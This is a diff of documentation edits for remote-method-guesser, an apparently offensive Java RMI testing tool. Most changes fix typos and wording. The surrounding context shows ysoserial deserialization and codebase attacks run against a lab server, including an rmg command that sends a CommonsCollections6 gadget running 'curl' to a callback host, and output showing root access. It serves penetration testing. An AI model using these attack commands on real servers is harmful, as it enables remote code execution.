@@ -155,7 +155,7 @@ When using the ``guess`` operation, *rmg* attempts to identify existing remote m
 to the remote server. This operation requires a wordlist that contains the corresponding method definitions in the
 following form:
 
-```consoloe
+```console
 [qtc@kali wordlists]$ head -n 5 /opt/remote-method-guesser/wordlists/rmg.txt
 boolean call(String dummy, String dummy2, String dummy3)
 boolean call(String dummy, String dummy2)
@@ -248,7 +248,7 @@ we can use the ``String login(java.util.HashMap dummy1)`` method that was guesse
 [+] Connecting to RMI registry... done.
 [+] Obtaining a list of bound names... done.
 [+] 3 names are bound to the registry.
-[+] Creating ysoserial payload...done.
+[+] Creating ysoserial payload... done.
 [+] Attacking String login(java.util.HashMap dummy1)
 [+] Target name specified. Only attacking bound name: secure-server
 [+] 
@@ -285,7 +285,7 @@ were implemented for all internal *RMI communication* and *deserialization attac
 is still quite common and *rmg* can be used to quickly verify the vulnerability.
 
 During the *enum* action, *rmg* already checks whether *JEP290* is installed on the targeted server. For testing purposes we can use the [example-server](https://github.com/qtc-de/beanshooter/packages/398561)
-of the [beanshooter](https://github.com/qtc-de/beanshooter) project, which is running a very old version of *Java*. The following output shows
+of the [beanshooter](https://github.com/qtc-de/beanshooter) project, which is running an unpatched version of *Java*. The following output shows
 that *rmg* can identify the missing *JEP 290* installation:
 
 ```console
@@ -314,12 +314,12 @@ that *rmg* can identify the missing *JEP 290* installation:
 [+] 	  JEP290 is most likely not installed (vulnerable)
 ```
 
-To confirm that the server is really vulnerable you can now perform a dedicated *deserialization attack* on the *DGC level*. This can be done
+To confirm that the server is really vulnerable you can perform a dedicated *deserialization attack* on the *DGC level*. This can be done
 by using the ``dgc`` action of *rmg*, which allows you to send *ysoserial* gadgets to the *DGC endpoint*:
 
 ```console
 [qtc@kali ~]$ rmg --ssl 172.18.0.2 9010 dgc CommonsCollections6 "curl 172.18.0.1:8000/vulnerable"
-[+] Creating ysoserial payload...done.
+[+] Creating ysoserial payload... done.
 [+] Attempting ysoserial attack on DGC endpoint...
 [+] 
 [+] 	Caught ClassCastException during deserialization attack.
@@ -477,7 +477,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 As previously mentioned, the internal *RMI communication* of modern *RMI servers* is hardened against *codebase* and *deserialization attacks*.
 Nonetheless, *remote-method-guesser* also supports *codebase attacks* on the *DGC* level and allows you to verify the vulnerability on older
-*RMI servers*. In theory, everything should work as for the method based codebase attacks mentioned above, but without specifying a method
+*RMI endpoints*. In theory, everything should work as for the method based codebase attacks mentioned above, but without specifying a method
 signature:
 
 ```console
@@ -491,9 +491,9 @@ signature:
 [-] 	or the file Exmaple.class was not found on the specified endpoint.
 ```
 
-Unfortunately, even the very old *RMI server* from the [beanshooter](https://github.com/qtc-de/beanshooter) project is no longer vulnerable
-and the functionality is currently untested. This documentation will be updated once I find a vulnerable endpoint. If you encountered a
-vulnerable server, please provide feedback :)
+Unfortunately, even the outdated *RMI server* from the [beanshooter](https://github.com/qtc-de/beanshooter) project is no longer vulnerable
+and the functionality is currently untested. This documentation will be updated once I find a vulnerable endpoint again. If you encountered a
+vulnerable server, please provide some feedback :)
 
 
 #### Sample Generation
